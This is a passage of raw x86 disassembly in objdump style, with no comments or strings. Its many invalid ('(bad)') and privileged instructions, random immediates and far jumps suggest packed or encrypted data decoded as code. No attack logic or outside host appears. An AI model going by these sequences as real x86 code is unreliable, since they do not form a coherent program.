  410d57:	ds fxch st(6)
  410d5a:	fxch   st(3)
  410d5c:	adc    ecx,edx
  410d5e:	add    dh,BYTE PTR [edi]
  410d60:	add    eax,0xf8a46628
  410d65:	push   esp
  410d66:	js     0x410de0
  410d68:	in     eax,0x7e
  410d6a:	js     0x410de4
  410d6c:	or     eax,0x7f16b1c3
  410d71:	call   0x1dfb:0x867aa615
  410d78:	or     esi,DWORD PTR [ecx+0x28]
  410d7b:	int3   
  410d7c:	sbb    al,BYTE PTR [ebp+0x5a]
  410d7f:	and    bl,0x55
  410d82:	xor    eax,0xf988b5e2
  410d87:	or     DWORD PTR [ebp+0x1b],eax
  410d8a:	mov    ds:0x1cc50395,al
  410d8f:	retf   0xc428
  410d92:	dec    ebp
  410d93:	in     eax,dx
  410d94:	pop    edx
  410d95:	pop    esi
  410d96:	outs   dx,BYTE PTR ds:[esi]
  410d97:	inc    esp
  410d98:	add    BYTE PTR [esi+0x18],bh
  410d9b:	sahf   
  410d9c:	aaa    
  410d9d:	mov    ebp,0x33d7b7e6
  410da2:	loope  0x410d78
  410da4:	arpl   WORD PTR [eiz*4+0x24d9db24],bp
  410dab:	xor    cl,BYTE PTR [ecx+0x17]
  410dae:	pushf  
  410daf:	cli    
  410db0:	out    0x22,eax
  410db2:	cmp    ebp,esp
  410db4:	inc    esi
  410db5:	cmp    BYTE PTR [ebx+0x1c2c79eb],bh
  410dbb:	pop    ecx
  410dbc:	shl    bh,0x4a
  410dbf:	pop    esp
  410dc0:	inc    esi
  410dc1:	rcl    DWORD PTR [esi+0x5984df3a],0x8d
  410dc8:	ret    0x519b
  410dcb:	adc    al,0x5e
  410dcd:	aad    0x43
  410dcf:	and    DWORD PTR [edi],edi
  410dd1:	add    al,0xdf
  410dd3:	scas   eax,DWORD PTR es:[edi]
  410dd4:	sti    
  410dd5:	pop    ss
  410dd6:	inc    ebp
  410dd7:	xchg   ebx,eax
  410dd8:	sbb    BYTE PTR [ebp-0x73a18522],0x3d
  410ddf:	jg     0x410e0e
  410de1:	clc    
  410de2:	into   
  410de3:	mov    bh,0x3b
  410de5:	leave  
  410de6:	mov    ebx,DWORD PTR [esi+0x52b8205a]
  410dec:	mov    ch,0x6e
  410dee:	cmp    bh,ch
  410df0:	mov    ebx,0x66c6f710
  410df5:	or     eax,0x13ee7e87
  410dfa:	xlat   BYTE PTR ds:[ebx]
  410dfb:	pop    ds
  410dfc:	cmp    eax,0x110826e1
  410e01:	ss xchg ecx,eax
  410e03:	sbb    BYTE PTR [esi],ah
  410e05:	jbe    0x410dd6
  410e07:	in     eax,dx
  410e08:	mov    bl,0x8a
  410e0a:	aad    0xb3
  410e0c:	xchg   BYTE PTR [eax],cl
  410e0e:	gs stos DWORD PTR es:[edi],eax
  410e10:	and    al,0x3e
  410e12:	ror    DWORD PTR [ebx+0x3154602f],0x75
  410e19:	idiv   dh
  410e1b:	hlt    
  410e1c:	outs   dx,BYTE PTR ds:[esi]
  410e1d:	imul   eax,DWORD PTR [ebx+0x7eeeb5d6],0x74db7e04
  410e27:	mov    ah,BYTE PTR [esp+eax*4]
  410e2a:	mov    esi,0x996c6186
  410e2f:	icebp  
  410e30:	in     eax,dx
  410e31:	imul   edx,edx,0x20
  410e34:	pop    eax
  410e35:	test   BYTE PTR [edi],ah
  410e37:	jp     0x410ded
  410e39:	adc    eax,0xc9ad5e0f
  410e3e:	sub    al,0xaf
  410e40:	xchg   ebp,eax
  410e41:	fsubr  DWORD PTR [eax+0x1fbf6e87]
  410e47:	stos   DWORD PTR es:[edi],eax
  410e48:	cmp    BYTE PTR [ebx+ebx*1+0x1999c4e0],bh
  410e4f:	mov    dl,0xb7
  410e51:	rcr    BYTE PTR [ecx+0x5320354a],1
  410e57:	sbb    DWORD PTR [edi+0x1360f8d],esi
  410e5d:	scas   al,BYTE PTR es:[edi]
  410e5e:	inc    esp
  410e5f:	xlat   BYTE PTR ds:[ebx]
  410e60:	mov    edi,0xeef6015b
  410e65:	xor    esi,DWORD PTR [edx-0x6f]
  410e68:	xor    DWORD PTR [edi-0x74d22ad],edi
  410e6e:	cld    
  410e6f:	mov    edx,0x2dabced5
  410e74:	gs icebp 
  410e76:	add    ecx,DWORD PTR [ebx+0x267e42c7]
  410e7c:	out    dx,al
  410e7d:	mov    ecx,0x3a38f061
  410e82:	sbb    eax,0x5adaf62d
  410e87:	xor    al,0x54
  410e89:	dec    edi
  410e8a:	jae    0x410ebc
  410e8c:	push   ss
  410e8d:	mov    DWORD PTR [ecx+eiz*1+0x3c8f4614],eax
  410e94:	shl    ch,1
  410e96:	in     eax,0x66
  410e98:	push   ss
  410e99:	jb     0x410ec2
  410e9b:	cli    
  410e9c:	pusha  
  410e9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e9e:	scas   eax,DWORD PTR es:[edi]
  410e9f:	jbe    0x410ea4
  410ea1:	dec    edx
  410ea2:	sbb    DWORD PTR [ebx+eax*2+0x4a],edx
  410ea6:	adc    al,BYTE PTR [ebx-0x51549c12]
  410eac:	dec    ecx
  410ead:	iret   
  410eae:	adc    ah,bl
  410eb0:	jge    0x410eac
  410eb2:	loope  0x410e58
  410eb4:	outs   dx,DWORD PTR ds:[esi]
  410eb5:	jb     0x410e89
  410eb7:	(bad)  
  410eb8:	cli    
  410eb9:	xchg   edx,eax
  410eba:	jnp    0x410e5d
  410ebc:	enter  0x12bc,0x58
  410ec0:	sub    eax,0xe275b66c
  410ec5:	repnz mov ebx,0xc1a106ef
  410ecb:	mov    eax,ds:0x3a44166f
  410ed0:	mov    fs,WORD PTR [esi+0x11]
  410ed3:	(bad)  
  410ed4:	scas   al,BYTE PTR es:[edi]
  410ed5:	and    ecx,ebp
  410ed7:	cmp    eax,0x8bdfc317
  410edc:	imul   DWORD PTR [ebx+0x6de6e5b7]
  410ee2:	fisub  WORD PTR [eax+0x305f5aac]
  410ee8:	bound  eax,QWORD PTR [esi-0x77]
  410eeb:	mov    esp,0x750f6973
  410ef0:	arpl   cx,sp
  410ef2:	(bad)  
  410ef3:	ja     0x410efa
  410ef5:	je     0x410f22
  410ef7:	call   FWORD PTR [ebp+0x3a]
  410efa:	bound  edi,QWORD PTR [ebx+0x2c]
  410efd:	sub    dh,al
  410eff:	fcomi  st,st(2)
  410f01:	mov    bh,0x5a
  410f03:	(bad)  
  410f04:	(bad)  
  410f06:	loopne 0x410eb5
  410f08:	pusha  
  410f09:	imul   BYTE PTR [edx+0x22]
  410f0c:	push   ebx
  410f0d:	jo     0x410f6d
  410f0f:	xchg   esi,esp
  410f11:	cmp    eax,0x824b09d9
  410f16:	xchg   edi,eax
  410f17:	outs   dx,DWORD PTR ds:[esi]
  410f18:	dec    eax
  410f19:	mov    ecx,0x19cefa02
  410f1e:	or     ch,0xb4
  410f21:	and    DWORD PTR [ebx],ecx
  410f23:	adc    eax,DWORD PTR [ecx-0x7d]
  410f26:	mov    edx,0xdbc28386
  410f2b:	fwait
  410f2c:	in     eax,dx
  410f2d:	(bad)  
  410f2f:	stos   BYTE PTR es:[edi],al
  410f30:	clc    
  410f31:	lds    esp,FWORD PTR [edx-0x6b]
  410f34:	push   ecx
  410f35:	clc    
  410f36:	dec    edi
  410f37:	scas   eax,DWORD PTR es:[edi]
  410f38:	adc    BYTE PTR [edx-0x43f7cac8],cl
  410f3e:	push   ss
  410f3f:	xor    ah,cl
  410f41:	mov    ?,WORD PTR [eax]
  410f43:	and    ebp,DWORD PTR [eax+0x5b]
  410f46:	push   edi
  410f47:	inc    ebx
  410f48:	scas   al,BYTE PTR es:[edi]
  410f49:	pop    es
  410f4a:	loopne 0x410f67
  410f4c:	add    eax,0xac27c2a7
  410f51:	add    esi,ebp
  410f53:	mov    edi,0xd538b5ee
  410f58:	test   al,0x1d
  410f5a:	xchg   edi,eax
  410f5b:	retf   
  410f5c:	inc    ecx
  410f5d:	aaa    
  410f5e:	imul   ebx,DWORD PTR [esi+eax*2],0x1ea5fe68
  410f65:	inc    eax
  410f66:	nop
  410f67:	cmp    edx,esi
  410f69:	test   DWORD PTR [edx],ebx
  410f6b:	jg     0x410f17
  410f6d:	sbb    al,BYTE PTR [eax-0x58]
  410f70:	push   esp
  410f71:	pop    ecx
  410f72:	int    0x1b
  410f74:	sbb    bh,dh
  410f76:	xor    al,bh
  410f78:	adc    edi,edx
  410f7a:	and    al,al
  410f7c:	fld    DWORD PTR [ebx]
  410f7e:	mov    DWORD PTR [ecx+0x40],ecx
  410f81:	mov    bl,0x35
  410f83:	pop    ebp
  410f84:	push   edx
  410f85:	fbld   TBYTE PTR [edx+0x2d04b159]
  410f8b:	jo     0x410fbb
  410f8d:	cmp    dh,BYTE PTR [ecx+0x718f7fcf]
  410f93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f94:	mov    al,0xb0
  410f96:	cmp    eax,0xf1c17472
  410f9b:	cmp    DWORD PTR ds:0x7e808ea4,edx
  410fa1:	icebp  
  410fa2:	ss retf 0x114a
  410fa6:	gs int3 
  410fa8:	(bad)
  410fac:	jbe    0x410f84
  410fae:	clc    
  410faf:	cmp    al,0x2
  410fb1:	push   edi
  410fb2:	xchg   bh,ch
  410fb4:	mov    bl,0x1d
  410fb6:	test   DWORD PTR [ecx-0x73],edx
  410fb9:	jnp    0x41102a
  410fbb:	je     0x410f95
  410fbd:	mov    edi,0x782aee7e
  410fc2:	mov    BYTE PTR [ebx-0x6c],0x22
  410fc6:	xchg   esp,eax
  410fc7:	imul   edi,DWORD PTR [edi+0x6],0x6752e81
  410fce:	fnstcw WORD PTR [ebp+0x6]
  410fd1:	ss jg  0x41102f
  410fd4:	lods   al,BYTE PTR ds:[esi]
  410fd5:	fild   QWORD PTR [ecx-0x7c1606fd]
  410fdb:	add    al,BYTE PTR [eax]
  410fdd:	add    ah,cl
  410fdf:	into   
  410fe0:	ror    esp,0xc1
  410fe3:	rcl    ecx,cl
  410fe5:	into   
  410fe6:	jbe    0x410f92
  410fe8:	inc    esp
  410fe9:	data16 ficomp DWORD PTR [ecx+0x5a658e2f]
  410ff0:	js     0x41106a
  410ff2:	in     eax,0x7e
  410ff4:	js     0x41106e
  410ff6:	push   ebx
  410ff7:	retf   0xb523
  410ffa:	push   ebp
  410ffb:	xchg   esi,eax
  410ffc:	scas   eax,DWORD PTR es:[edi]
  410ffd:	push   ebx
  410ffe:	test   eax,0xedfce18
  411003:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411004:	and    al,0x8b
  411006:	les    ecx,FWORD PTR [si+0x2673]
  41100b:	ins    BYTE PTR es:[edi],dx
  41100c:	je     0x411033
  41100e:	fisub  DWORD PTR [ebx+0x43]
  411011:	mov    cl,0x5d
  411013:	sub    edi,DWORD PTR [ecx+0x39e0a36e]
  411019:	arpl   WORD PTR [eax+edx*4+0x6ab0a79b],di
  411020:	mov    BYTE PTR [esi],ch
  411022:	pop    es
  411023:	pop    ss
  411024:	in     eax,0xb7
  411026:	popf   
  411027:	jnp    0x411069
  411029:	jle    0x4110a3
  41102b:	je     0x411017
  41102d:	(bad)  
  41102e:	fwait
  41102f:	mov    eax,ds:0x9b2890f3
  411034:	xchg   ebx,eax
  411035:	sbb    ch,cl
  411037:	jecxz  0x4110ad
  411039:	dec    edi
  41103a:	ins    BYTE PTR es:[edi],dx
  41103b:	call   0xd6ea:0x105c4c2c
  411042:	mov    al,ds:0x6598a31c
  411047:	mov    ah,0xa9
  411049:	mov    al,ds:0x1d9a51bb
  41104e:	xchg   ebx,eax
  41104f:	loopne 0x411049
  411051:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411052:	stc    
  411053:	(bad)
  411056:	and    eax,0x51ae38fb
  41105b:	push   edi
  41105c:	jecxz  0x411089
  41105e:	xor    ch,BYTE PTR [ecx]
  411060:	fiadd  DWORD PTR [esi]
  411062:	pop    es
  411063:	shl    BYTE PTR [ebx],cl
  411065:	and    BYTE PTR [ebp+0x2ba80cb2],bh
  41106b:	inc    ecx
  41106c:	nop
  41106d:	adc    eax,DWORD PTR [ecx-0x58b2a4d9]
  411073:	push   ecx
  411074:	push   ebx
  411075:	in     eax,dx
  411076:	dec    edx
  411077:	sbb    BYTE PTR [edx+0x2c],dl
  41107a:	dec    edx
  41107b:	das    
  41107c:	pop    ebp
  41107d:	imul   esp,ebp,0x1a
  411080:	cwde   
  411081:	js     0x4110fd
  411083:	sub    eax,0x4fd8614c
  411088:	add    ebx,DWORD PTR [ecx+ebx*8+0x7]
  41108c:	jmp    0x5e389dae
  411091:	lds    ebp,FWORD PTR [esi-0x63]
  411094:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411095:	pop    esi
  411096:	shr    ecx,0x85
  411099:	lahf   
  41109a:	pop    ebp
  41109b:	std    
  41109c:	fs add al,0x7
  41109f:	imul   esp,DWORD PTR [esi],0xffffffaa
  4110a2:	pusha  
  4110a3:	mov    ebp,0x57456f85
  4110a8:	shr    DWORD PTR [ecx],1
  4110aa:	add    BYTE PTR [ebp+0x5efe1a42],bl
  4110b0:	or     eax,0x75259e
  4110b5:	int    0x34
  4110b7:	in     eax,0x75
  4110b9:	mov    dl,0x59
  4110bb:	jne    0x4110b3
  4110bd:	stos   BYTE PTR es:[edi],al
  4110be:	retf   
  4110bf:	adc    DWORD PTR [ebx],edx
  4110c1:	repnz inc edi
  4110c3:	les    edi,FWORD PTR [eax+esi*1+0x4cf1f13]
  4110ca:	inc    esp
  4110cb:	fstp   TBYTE PTR [edi+0x49]
  4110ce:	cmp    BYTE PTR [ebx-0x4],0xc9
  4110d2:	pop    ebp
  4110d3:	(bad)  
  4110d5:	jae    0x41107b
  4110d7:	add    BYTE PTR [esi+0x10d0266b],bl
  4110dd:	cmc    
  4110de:	add    BYTE PTR [ebp+0x6f],dl
  4110e1:	xlat   BYTE PTR ds:[ebx]
  4110e2:	call   0x15d91f2f
  4110e7:	mov    eax,DWORD PTR [eax+eax*8]
  4110ea:	push   es
  4110eb:	stos   BYTE PTR es:[edi],al
  4110ec:	adc    al,BYTE PTR [ebx-0x65]
  4110ef:	sub    ecx,ebx
  4110f1:	sbb    bh,BYTE PTR [esi-0xc8ec9fa]
  4110f7:	or     eax,0x9cd5a1c5
  4110fc:	push   ecx
  4110fd:	mov    ds:0x65f0caee,eax
  411102:	push   0xffffff89
  411104:	shl    ecx,1
  411106:	or     BYTE PTR [edx+ebx*4],cl
  411109:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41110a:	and    esi,ebp
  41110c:	xchg   ecx,eax
  41110d:	add    ch,0x9f
  411110:	ins    DWORD PTR es:[edi],dx
  411111:	arpl   dx,ax
  411113:	scas   eax,DWORD PTR es:[edi]
  411114:	scas   eax,DWORD PTR es:[edi]
  411115:	dec    esi
  411116:	mov    bh,0x2e
  411118:	mov    dh,0xa1
  41111a:	sbb    BYTE PTR [edi-0x40],cl
  41111d:	int3   
  41111e:	call   0xc295f0d7
  411123:	jo     0x411120
  411125:	mov    WORD PTR [ebx+edi*2-0x16],ds
  411129:	inc    edi
  41112a:	in     eax,dx
  41112b:	sbb    DWORD PTR cs:[esi],0x4a1f760f
  411132:	pop    ebp
  411133:	jmp    DWORD PTR [edx]
  411135:	rol    eax,cl
  411137:	push   ebx
  411138:	aad    0x66
  41113a:	addr16 stc 
  41113c:	mov    eax,ds:0x45578db1
  411141:	int3   
  411142:	ins    BYTE PTR es:[edi],dx
  411143:	sub    eax,0xd34084c7
  411148:	in     eax,dx
  411149:	cmp    BYTE PTR [ecx+edi*4+0x16],al
  41114d:	cmp    DWORD PTR [edx],esp
  41114f:	lods   eax,DWORD PTR ds:[esi]
  411150:	xor    ch,BYTE PTR fs:[ecx-0x50]
  411154:	clc    
  411155:	cmp    eax,0xa45813d2
  41115a:	push   edi
  41115b:	sti    
  41115c:	adc    al,0x58
  41115e:	sub    bh,cl
  411160:	mov    DWORD PTR [esi-0x5f],ebx
  411163:	repz retf 0x30c8
  411167:	pop    eax
  411168:	fisttp QWORD PTR [eax]
  41116a:	or     DWORD PTR [ecx+0x3fb59947],0xc21d48fa
  411174:	xlat   BYTE PTR ds:[ebx]
  411175:	cwde   
  411176:	or     eax,0x2aa9b28b
  41117b:	xor    DWORD PTR [edx+0x4a5d735a],eax
  411181:	ins    BYTE PTR es:[edi],dx
  411182:	inc    edx
  411183:	mov    bh,0x36
  411185:	stc    
  411186:	inc    edi
  411187:	popf   
  411188:	inc    ecx
  411189:	int    0xe0
  41118b:	into   
  41118c:	sbb    bh,dl
  41118e:	stos   BYTE PTR es:[edi],al
  41118f:	add    ah,BYTE PTR [eax-0x6d]
  411192:	xor    BYTE PTR [ebx],dh
  411194:	test   eax,0x46962149
  411199:	(bad)  
  41119a:	test   ax,0xeb00
  41119e:	fild   DWORD PTR ds:0x4a81f33b
  4111a4:	popa   
  4111a5:	or     cl,BYTE PTR [ecx-0x58]
  4111a8:	retf   0x9c44
  4111ab:	jmp    0x98602418
  4111b0:	jp     0x411156
  4111b2:	lods   al,BYTE PTR ds:[esi]
  4111b3:	mov    eax,DWORD PTR [ecx-0x68d2ae1a]
  4111b9:	cmp    eax,0xe6aa9cf0
  4111be:	mov    cl,0x72
  4111c0:	push   ebx
  4111c1:	jmp    0x33064b4
  4111c6:	daa    
  4111c7:	bound  ebp,QWORD PTR [eax+0x44]
  4111ca:	jb     0x411178
  4111cc:	addr16 push edx
  4111ce:	mov    eax,DWORD PTR [ebx-0x2878eb14]
  4111d4:	cmp    dh,dl
  4111d6:	push   ss
  4111d7:	pop    ds
  4111d8:	mov    cl,0x3b
  4111da:	cmc    
  4111db:	scas   al,BYTE PTR es:[edi]
  4111dc:	dec    esp
  4111dd:	jg     0x4111e9
  4111df:	scas   eax,DWORD PTR es:[edi]
  4111e0:	fwait
  4111e1:	push   ss
  4111e2:	jp     0x4111b6
  4111e4:	dec    cl
  4111e6:	mov    ebp,0xf9bb452d
  4111eb:	(bad)  [ebx-0x402fc1bd]
  4111f1:	dec    esi
  4111f2:	sub    cl,BYTE PTR [esi-0x7f]
  4111f5:	or     DWORD PTR [eax-0x63d99453],esi
  4111fb:	sub    BYTE PTR [ebx+0x693a6075],ch
  411201:	jno    0x411200
  411203:	ss inc edi
  411205:	jl     0x41118a
  411207:	pop    ecx
  411208:	repnz popa 
  41120a:	in     al,dx
  41120b:	jns    0x4111da
  41120d:	mov    ds:0x161267a1,al
  411212:	xor    ah,0xd8
  411215:	popf   
  411216:	test   eax,0x42ce0e30
  41121b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41121c:	and    edx,edx
  41121e:	enter  0x6a25,0xae
  411222:	push   ds
  411223:	dec    esp
  411224:	loope  0x411217
  411226:	repnz xor edx,esp
  411229:	jp     0x41120f
  41122b:	xchg   esi,eax
  41122c:	mov    ch,0x96
  41122e:	cld    
  41122f:	sbb    esp,ebx
  411231:	in     al,0xe0
  411233:	icebp  
  411234:	sub    BYTE PTR [edx],ah
  411236:	sbb    eax,0x88fc9bf0
  41123b:	pop    eax
  41123c:	or     eax,0x95517018
  411241:	mov    edx,DWORD PTR [ebp-0x343ddb00]
  411247:	(bad)  
  411248:	pusha  
  411249:	(bad)  
  41124a:	mov    WORD PTR [edi+eiz*8],gs
  41124d:	add    al,0x31
  41124f:	push   esp
  411250:	add    DWORD PTR [ecx-0x35],esp
  411253:	pop    ebp
  411254:	add    BYTE PTR [ecx],al
  411256:	(bad)  
  411258:	fcmovb st,st(7)
  41125a:	daa    
  41125b:	enter  0x970,0xcd
  41125f:	and    al,0xae
  411261:	add    edx,ecx
  411263:	imul   edx,edi
  411266:	jmp    0x4114ee
  41126b:	aas    
  41126c:	xlat   BYTE PTR ds:[ebx]
  41126d:	xlat   BYTE PTR ds:[ebx]
  41126e:	retf   
  41126f:	xlat   BYTE PTR ds:[ebx]
  411270:	retf   
  411271:	rcr    ebx,cl
  411273:	and    cl,ah
  411275:	or     BYTE PTR [eax-0x3a],al
  411278:	push   ss
  411279:	inc    eax
  41127a:	xchg   edx,edx
  41127c:	pop    edi
  41127d:	js     0x4112f7
  41127f:	in     eax,0x7e
  411281:	js     0x4112fb
  411283:	dec    ax
  411285:	or     eax,0x73213211
  41128a:	je     0x411295
  41128c:	adc    DWORD PTR [ebx+0x13e06aaf],0x15
  411293:	push   cs
  411294:	add    al,BYTE PTR [edi-0x711c8a1]
  41129a:	mov    gs,WORD PTR [eax]
  41129c:	adc    edx,edx
  41129e:	mov    ebp,0x3665150
  4112a3:	cmp    DWORD PTR [ebx],ebx
  4112a5:	add    ecx,DWORD PTR [edx+0x2f]
  4112a8:	xchg   ebx,eax
  4112a9:	outs   dx,DWORD PTR ds:[esi]
  4112aa:	mov    edi,ds
  4112ac:	cld    
  4112ad:	test   edi,edx
  4112af:	mov    DWORD PTR [eax+0x3a],edi
  4112b2:	push   cs
  4112b3:	fwait
  4112b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112b5:	mov    ebp,0x8badc3ec
  4112ba:	pop    edi
  4112bb:	repnz fdiv DWORD PTR [ebp-0x48]
  4112bf:	loop   0x4112f7
  4112c1:	arpl   WORD PTR [ebx+0x5],sp
  4112c4:	bound  esi,QWORD PTR [edx]
  4112c6:	mov    BYTE PTR [ebp+edi*4-0x2505f8c9],bl
  4112cd:	jnp    0x411289
  4112cf:	out    dx,al
  4112d0:	pop    esp
  4112d1:	imul   ebx,DWORD PTR [eax+0x1b],0xbb922fb9
  4112d8:	xchg   esi,eax
  4112d9:	(bad)  
  4112db:	adc    dh,cl
  4112dd:	dec    eax
  4112de:	cli    
  4112df:	sbb    BYTE PTR [ecx+0x3c],al
  4112e2:	push   0xafc8b835
  4112e7:	inc    esi
  4112e8:	mov    ch,0xc9
  4112ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112eb:	jae    0x41133d
  4112ed:	fimul  WORD PTR [ebx]
  4112ef:	xlat   BYTE PTR ds:[ebx]
  4112f0:	xor    BYTE PTR [ebx],al
  4112f2:	dec    eax
  4112f3:	in     al,dx
  4112f4:	sbb    DWORD PTR [ebx+0x5f6a75a3],ecx
  4112fa:	push   edx
  4112fb:	and    BYTE PTR [ecx],al
  4112fd:	stos   DWORD PTR es:[edi],eax
  4112fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112ff:	test   al,0x56
  411301:	lahf   
  411302:	push   edx
  411303:	mov    ds:0xa18ac398,al
  411308:	(bad)  [ebx-0x24f888b]
  41130e:	popa   
  41130f:	lock sbb eax,0x6bef47ce
  411315:	adc    edi,DWORD PTR [edx+0x78]
  411318:	mov    al,ds:0xdf9c5378
  41131d:	lock lahf 
  41131f:	xchg   edi,eax
  411320:	rcr    ebx,0xc6
  411323:	js     0x41130d
  411325:	pop    eax
  411326:	lods   al,BYTE PTR ds:[esi]
  411327:	xchg   edx,eax
  411328:	sub    ecx,eax
  41132a:	outs   dx,DWORD PTR ds:[esi]
  41132b:	inc    eax
  41132c:	pop    ebx
  41132d:	mov    esi,0x3d0909dc
  411332:	call   0x982c291a
  411337:	mov    esp,0xbbaf2f56
  41133c:	shl    DWORD PTR [eax+0x2aa8b4be],1
  411342:	iret   
  411343:	scas   al,BYTE PTR es:[edi]
  411344:	and    ch,BYTE PTR ds:0xbcc433b1
  41134a:	and    edx,eax
  41134c:	and    BYTE PTR [edi+0xe],dh
  41134f:	outs   dx,BYTE PTR ds:[esi]
  411350:	test   DWORD PTR [edi-0x73b5082a],0x9fab9bae
  41135a:	or     BYTE PTR [esi+0x56],cl
  41135d:	addr16 push 0x6f
  411360:	lds    edi,FWORD PTR [esi+0x19]
  411363:	pop    ss
  411364:	and    DWORD PTR [ecx+ebx*1+0x1c0b9f57],esp
  41136b:	arpl   WORD PTR [edi],bp
  41136d:	hlt    
  41136e:	jp     0x4113b9
  411370:	cmp    BYTE PTR [ebx+0xa],0x17
  411374:	lahf   
  411375:	mov    ebp,0x609e9ff
  41137a:	out    dx,eax
  41137b:	outs   dx,BYTE PTR ds:[esi]
  41137c:	pop    es
  41137d:	ss xor al,0xe6
  411380:	lahf   
  411381:	mov    eax,esi
  411383:	stos   BYTE PTR es:[edi],al
  411384:	xchg   edi,eax
  411385:	inc    edx
  411386:	cmp    BYTE PTR [ebp+0x12],al
  411389:	xchg   edi,eax
  41138a:	sbb    BYTE PTR [esi+0x5e327e69],ah
  411390:	neg    DWORD PTR [edx-0x6b7b163d]
  411396:	aaa    
  411397:	fadd   QWORD PTR [eax+0x15c455d2]
  41139d:	stc    
  41139e:	test   eax,0xd019342c
  4113a3:	and    al,0x81
  4113a5:	das    
  4113a6:	push   0xceb7b5d0
  4113ab:	dec    edx
  4113ac:	(bad)  
  4113ad:	fiadd  DWORD PTR [edx]
  4113af:	outs   dx,BYTE PTR ds:[esi]
  4113b0:	in     eax,0x44
  4113b2:	cld    
  4113b3:	mov    cl,0xd8
  4113b5:	sbb    eax,0xcb02cff9
  4113ba:	xor    esi,esp
  4113bc:	mov    bl,0x15
  4113be:	int    0x2
  4113c0:	jmp    0xadd21e02
  4113c5:	sub    ebx,DWORD PTR [esi+eiz*1-0x56]
  4113c9:	dec    esi
  4113ca:	(bad)  
  4113cb:	mov    bh,0xca
  4113cd:	mov    ecx,0x60574f69
  4113d2:	ds out dx,al
  4113d4:	aad    0xfe
  4113d6:	jno    0x411418
  4113d8:	lea    ecx,[ebx+ebx*8-0x7f]
  4113dc:	wrmsr  
  4113de:	sub    BYTE PTR [ebx+0x78],0x9d
  4113e2:	push   edi
  4113e3:	hlt    
  4113e4:	mov    bl,0xac
  4113e6:	aas    
  4113e7:	mov    ds:0x995c0596,al
  4113ec:	xor    ah,ch
  4113ee:	mov    es,WORD PTR [esp-0x34]
  4113f2:	les    ecx,FWORD PTR [edi+0x4e]
  4113f5:	xchg   edx,eax
  4113f6:	mov    al,0xd1
  4113f8:	dec    edi
  4113f9:	shr    BYTE PTR [ebp+0x79],0x3b
  4113fd:	xchg   esp,eax
  4113fe:	in     eax,0x4d
  411400:	es scas al,BYTE PTR es:[edi]
  411402:	adc    al,0x8f
  411404:	rol    BYTE PTR [ebp-0x772d549b],1
  41140a:	mov    eax,ds:0xf8b7bcce
  41140f:	add    dl,0x96
  411412:	sub    eax,DWORD PTR [ebp+0x62ca24c1]
  411418:	sub    BYTE PTR [edx+0x3247400c],ah
  41141e:	xchg   DWORD PTR [ebp-0x1a],esi
  411421:	out    dx,eax
  411422:	mov    ah,0xa5
  411424:	and    eax,0x565231f6
  411429:	ds pusha 
  41142b:	sahf   
  41142c:	and    esi,DWORD PTR [eax-0x643313f9]
  411432:	ret    0x9e1c
  411435:	jge    0x411410
  411437:	(bad)  
  411438:	sahf   
  411439:	sub    esp,DWORD PTR [ebx-0x3b]
  41143c:	jp     0x4114af
  41143e:	mov    edx,0x728f793e
  411443:	dec    eax
  411444:	fadd   QWORD PTR [edx]
  411446:	pop    ebx
  411447:	stos   DWORD PTR es:[edi],eax
  411448:	and    DWORD PTR [edx-0xe868a91],ebx
  41144e:	lahf   
  41144f:	add    eax,0x48d783de
  411454:	mov    ch,0xbd
  411456:	pusha  
  411457:	retf   
  411458:	les    ebx,FWORD PTR [ecx]
  41145a:	lods   eax,DWORD PTR ds:[esi]
  41145b:	cmp    DWORD PTR [ecx+0x7b],ebx
  41145e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41145f:	into   
  411460:	xchg   edx,eax
  411461:	or     edi,DWORD PTR [edx-0x37]
  411464:	push   ss
  411465:	cdq    
  411466:	lock in eax,0xe3
  411469:	ja     0x41149f
  41146b:	mov    cl,0xaf
  41146d:	clc    
  41146e:	gs push esi
  411470:	(bad)
  411473:	or     esi,esp
  411475:	sti    
  411476:	jge    0x41143e
  411478:	sub    al,0x58
  41147a:	or     eax,0x5aecafd8
  41147f:	ja     0x4114e2
  411481:	aas    
  411482:	leave  
  411483:	mov    esp,0xddd5ede5
  411488:	jbe    0x4114fa
  41148a:	jo     0x41140c
  41148c:	inc    eax
  41148d:	pop    esi
  41148e:	sub    dh,BYTE PTR [ebx+0x20]
  411491:	test   esp,ecx
  411493:	int3   
  411494:	add    esp,DWORD PTR ds:0x2b7ce350
  41149a:	loopne 0x41145e
  41149c:	xchg   ah,bh
  41149e:	mul    DWORD PTR [edi+0x58a66aa4]
  4114a4:	in     al,dx
  4114a5:	jge    0x41151e
  4114a7:	xchg   ah,bl
  4114a9:	xor    BYTE PTR [ecx-0x7b],dh
  4114ac:	push   esp
  4114ad:	(bad)  
  4114ae:	fist   WORD PTR ds:0xc45b95c5
  4114b4:	sahf   
  4114b5:	pop    ds
  4114b6:	cwde   
  4114b7:	mov    edx,0x748e116f
  4114bc:	mov    ds:0xe80ea54,eax
  4114c1:	repnz sbb ah,dl
  4114c4:	xchg   ebp,eax
  4114c5:	sbb    eax,0xc2570aa0
  4114ca:	sbb    bh,ah
  4114cc:	repz into 
  4114ce:	jns    0x4114d8
  4114d0:	push   es
  4114d1:	popf   
  4114d2:	push   ebp
  4114d3:	xchg   ebp,eax
  4114d4:	ins    DWORD PTR es:[edi],dx
  4114d5:	out    0x9b,al
  4114d7:	dec    esp
  4114d8:	mov    ch,0xde
  4114da:	mov    ah,0xac
  4114dc:	adc    ecx,DWORD PTR [esi+0x57d08b40]
  4114e2:	sbb    BYTE PTR [ebx-0x3f],bl
  4114e5:	enter  0xeecc,0xe5
  4114e9:	addr16 mov ebp,0x8b7d32e5
  4114ef:	jge    0x4114e9
  4114f1:	mov    ebx,DWORD PTR [ebp-0x10]
  4114f4:	sub    ebx,edi
  4114f6:	cmp    ebx,edx
  4114f8:	ja     0x41178e
  4114fe:	jmp    0x411786
  411503:	(bad)  
  411504:	rol    edi,cl
